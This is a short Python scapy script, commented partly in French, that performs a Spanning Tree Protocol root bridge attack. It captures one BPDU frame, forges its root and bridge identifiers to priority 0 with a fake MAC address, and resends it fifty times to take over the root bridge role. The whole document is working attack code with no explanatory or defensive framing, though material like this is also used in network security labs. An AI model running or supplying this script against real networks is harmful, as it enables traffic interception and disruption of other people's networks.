#!/usr/bin/python3
#Importation de la bibliothèque scapy
from scapy.all import *
#Recherche et envoie d'une trame STP avec une adresse de multidiffusion
frame = sniff(filter="ether dst 01:80:c2:00:00:00",count=1)
#Change the MAC address in the frame to the following:
frame[0].src="00:00:00:00:00:01"
#Set Rootid
frame[0].rootid=0
#Set rootmac
frame[0].rootmac="00:00:00:00:00:01"
#Set Bridgeid
frame[0].bridgeid=0
#Set rootmac
frame[0].bridgemac="00:00:00:00:00:01"
#Show changed frame
frame[0].show()
#Loop to send multiple frames into the network:
for i in range (0, 50):
    #Send changed frame back into the network:
    sendp(frame[0], loop=0, verbose=1)
    #Sleep / wait for one second:
    time.sleep(1)